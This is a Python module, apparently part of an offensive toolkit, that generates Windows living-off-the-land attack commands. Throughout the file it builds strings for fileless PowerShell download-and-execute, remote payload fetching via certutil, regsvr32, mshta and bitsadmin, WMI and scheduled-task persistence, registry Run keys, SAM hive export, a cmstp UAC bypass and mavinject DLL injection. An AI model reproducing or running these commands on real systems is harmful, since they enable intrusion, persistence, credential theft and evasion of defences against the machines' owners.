"""
Windows Living Off The Land - Windows-specific LOLBAS techniques
Abuses PowerShell, WMI, certutil, regsvr32, rundll32, and more
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from pathlib import Path
from .lolbas_manager import (
    LOLBASExecutor, DownloadExecutor, ExecutionExecutor,
    PersistenceExecutor, ReconExecutor, ExfiltrationExecutor
)

logger = logging.getLogger(__name__)


class WindowsLOL:
    """
    Windows Living Off The Land techniques
    Uses built-in Windows binaries for offensive operations
    """
    
    def __init__(self):
        """Initialize Windows LOLBAS"""
        logger.info("WindowsLOL initialized")
        
    # PowerShell techniques
    
    async def powershell_download(self, url: str, output: str) -> str:
        """Download file using PowerShell"""
        cmd = f'powershell -c "Invoke-WebRequest -Uri \'{url}\' -OutFile \'{output}\'"'
        logger.info(f"PowerShell download: {url}")
        return cmd
        
    async def powershell_download_execute(self, url: str) -> str:
        """Download and execute in memory using PowerShell"""
        cmd = f'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'{url}\')"'
        logger.info("PowerShell download-execute (fileless)")
        return cmd
        
    async def powershell_encoded_command(self, command: str) -> str:
        """Execute base64 encoded PowerShell command"""
        import base64
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        logger.info("PowerShell encoded command")
        return cmd
        
    async def powershell_bypass_execution_policy(self, script: str) -> str:
        """Execute PowerShell bypassing execution policy"""
        cmd = f'powershell -ExecutionPolicy Bypass -File "{script}"'
        logger.info("PowerShell execution policy bypass")
        return cmd
        
    async def powershell_hidden_window(self, command: str) -> str:
        """Execute PowerShell in hidden window"""
        cmd = f'powershell -WindowStyle Hidden -c "{command}"'
        logger.info("PowerShell hidden window")
        return cmd
        
    # certutil techniques
    
    async def certutil_download(self, url: str, output: str) -> str:
        """Download file using certutil"""
        cmd = f'certutil -urlcache -split -f {url} {output}'
        logger.info(f"certutil download: {url}")
        return cmd
        
    async def certutil_decode(self, input_file: str, output_file: str) -> str:
        """Decode base64 file using certutil"""
        cmd = f'certutil -decode {input_file} {output_file}'
        logger.info("certutil base64 decode")
        return cmd
        
    async def certutil_encode(self, input_file: str, output_file: str) -> str:
        """Encode file to base64 using certutil"""
        cmd = f'certutil -encode {input_file} {output_file}'
        logger.info("certutil base64 encode")
        return cmd
        
    # regsvr32 techniques
    
    async def regsvr32_remote_execution(self, url: str) -> str:
        """Execute remote scriptlet using regsvr32"""
        cmd = f'regsvr32 /s /n /u /i:{url} scrobj.dll'
        logger.info("regsvr32 remote scriptlet execution")
        return cmd
        
    # rundll32 techniques
    
    async def rundll32_execute_javascript(self, script: str) -> str:
        """Execute JavaScript using rundll32"""
        cmd = f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";{script}'
        logger.info("rundll32 JavaScript execution")
        return cmd
        
    async def rundll32_load_dll(self, dll_path: str, entry_point: str = 'DllMain') -> str:
        """Load DLL using rundll32"""
        cmd = f'rundll32.exe {dll_path},{entry_point}'
        logger.info(f"rundll32 load DLL: {dll_path}")
        return cmd
        
    # mshta techniques
    
    async def mshta_remote_execution(self, url: str) -> str:
        """Execute remote HTA file using mshta"""
        cmd = f'mshta {url}'
        logger.info("mshta remote HTA execution")
        return cmd
        
    async def mshta_inline_vbscript(self, vbscript: str) -> str:
        """Execute inline VBScript using mshta"""
        cmd = f'mshta vbscript:Execute("{vbscript}")'
        logger.info("mshta inline VBScript")
        return cmd
        
    # WMI techniques
    
    async def wmi_execute_process(self, command: str) -> str:
        """Execute process using WMI"""
        cmd = f'wmic process call create "{command}"'
        logger.info(f"WMI process execution: {command}")
        return cmd
        
    async def wmi_remote_execution(self, target: str, command: str) -> str:
        """Execute command on remote system via WMI"""
        cmd = f'wmic /node:{target} process call create "{command}"'
        logger.info(f"WMI remote execution on {target}")
        return cmd
        
    async def wmi_persistence(self, script: str) -> str:
        """Create WMI event subscription for persistence"""
        # Complex multi-step process
        logger.info("WMI event subscription persistence")
        
        commands = [
            # Create event filter
            f'$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{Name="PersistFilter";EventNamespace="root\\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"}}',
            
            # Create event consumer
            f'$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{Name="PersistConsumer";CommandLineTemplate="{script}"}}',
            
            # Bind filter to consumer
            'Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}'
        ]
        
        return '; '.join(commands)
        
    # bitsadmin techniques
    
    async def bitsadmin_download(self, url: str, output: str) -> str:
        """Download file using bitsadmin"""
        job_name = "UpdateJob"
        cmd = f'bitsadmin /transfer {job_name} /download /priority high {url} {output}'
        logger.info(f"bitsadmin download: {url}")
        return cmd
        
    # msiexec techniques
    
    async def msiexec_remote_install(self, msi_url: str) -> str:
        """Install MSI from remote location"""
        cmd = f'msiexec /i {msi_url} /quiet /norestart'
        logger.info(f"msiexec remote install: {msi_url}")
        return cmd
        
    # schtasks techniques
    
    async def schtasks_create_persistence(self, task_name: str, command: str, trigger: str = "ONLOGON") -> str:
        """Create scheduled task for persistence"""
        cmd = f'schtasks /create /tn "{task_name}" /tr "{command}" /sc {trigger} /ru SYSTEM /f'
        logger.info(f"schtasks persistence: {task_name}")
        return cmd
        
    # sc (service control) techniques
    
    async def sc_create_service(self, service_name: str, binary_path: str) -> str:
        """Create Windows service"""
        cmd = f'sc create {service_name} binPath= "{binary_path}" start= auto'
        logger.info(f"sc create service: {service_name}")
        return cmd
        
    # reg (registry) techniques
    
    async def reg_add_persistence(self, value_name: str, command: str) -> str:
        """Add registry Run key for persistence"""
        cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {value_name} /t REG_SZ /d "{command}" /f'
        logger.info(f"Registry Run key persistence: {value_name}")
        return cmd
        
    async def reg_export_sam(self, output: str) -> str:
        """Export SAM registry hive"""
        cmd = f'reg save HKLM\\SAM {output}'
        logger.info("Exporting SAM registry hive")
        return cmd
        
    # netsh techniques
    
    async def netsh_port_forward(self, listen_port: int, target_ip: str, target_port: int) -> str:
        """Create port forwarding rule"""
        cmd = f'netsh interface portproxy add v4tov4 listenport={listen_port} connectaddress={target_ip} connectport={target_port}'
        logger.info(f"Port forwarding: {listen_port} -> {target_ip}:{target_port}")
        return cmd
        
    # forfiles techniques
    
    async def forfiles_execute(self, command: str) -> str:
        """Execute command using forfiles"""
        cmd = f'forfiles /p c:\\windows\\system32 /m cmd.exe /c "{command}"'
        logger.info("forfiles command execution")
        return cmd
        
    # cmstp techniques
    
    async def cmstp_uac_bypass(self, inf_file: str) -> str:
        """UAC bypass using cmstp"""
        cmd = f'cmstp /s {inf_file}'
        logger.info("cmstp UAC bypass")
        return cmd
        
    # odbcconf techniques
    
    async def odbcconf_load_dll(self, dll_path: str) -> str:
        """Load DLL using odbcconf"""
        cmd = f'odbcconf /a {{REGSVR {dll_path}}}'
        logger.info(f"odbcconf DLL load: {dll_path}")
        return cmd
        
    # mavinject techniques (process injection)
    
    async def mavinject_inject_dll(self, pid: int, dll_path: str) -> str:
        """Inject DLL into process using mavinject"""
        cmd = f'mavinject.exe {pid} /INJECTRUNNING {dll_path}'
        logger.info(f"mavinject DLL injection into PID {pid}")
        return cmd
        
    # Excel/Word COM automation
    
    async def excel_macro_execution(self, macro_file: str) -> str:
        """Execute Excel macro via COM"""
        ps_script = f'''
        $excel = New-Object -ComObject Excel.Application
        $excel.Visible = $false
        $workbook = $excel.Workbooks.Open("{macro_file}")
        $excel.Run("MacroName")
        $workbook.Close()
        $excel.Quit()
        '''
        return f'powershell -c "{ps_script}"'
        
    # Advanced techniques
    
    async def installutil_bypass(self, assembly: str) -> str:
        """Execute .NET assembly using InstallUtil"""
        cmd = f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {assembly}'
        logger.info("InstallUtil .NET execution")
        return cmd
        
    async def msbuild_execute_inline(self, csharp_code: str) -> str:
        """Execute C# code using MSBuild"""
        # Would create XML build file with inline C# code
        logger.info("MSBuild inline C# execution")
        return 'msbuild.exe payload.xml'
        
    async def dfsvc_download_execute(self, url: str) -> str:
        """Download and execute using dfsvc"""
        cmd = f'dfsvc.exe {url}'
        logger.info("dfsvc download-execute")
        return cmd


class PowerShellExecutor(ExecutionExecutor):
    """PowerShell-based execution"""
    
    def __init__(self):
        super().__init__("PowerShell Execution", "powershell.exe")
        
    def build_command(self, payload: str, method: str = 'direct', **kwargs) -> str:
        if method == 'encoded':
            import base64
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f'powershell -EncodedCommand {encoded}'
        elif method == 'hidden':
            return f'powershell -WindowStyle Hidden -c "{payload}"'
        elif method == 'bypass':
            return f'powershell -ExecutionPolicy Bypass -c "{payload}"'
        else:
            return f'powershell -c "{payload}"'


class CertutilDownloader(DownloadExecutor):
    """Certutil-based downloader"""
    
    def __init__(self):
        super().__init__("Certutil Download", "certutil.exe")
        
    def build_command(self, url: str, output_path: str, **kwargs) -> str:
        return f'certutil -urlcache -split -f {url} {output_path}'


class WMIExecutor(ExecutionExecutor):
    """WMI-based execution"""
    
    def __init__(self):
        super().__init__("WMI Execution", "wmic.exe")
        
    def build_command(self, payload: str, method: str = 'local', **kwargs) -> str:
        if method == 'remote':
            target = kwargs.get('target', 'localhost')
            return f'wmic /node:{target} process call create "{payload}"'
        else:
            return f'wmic process call create "{payload}"'
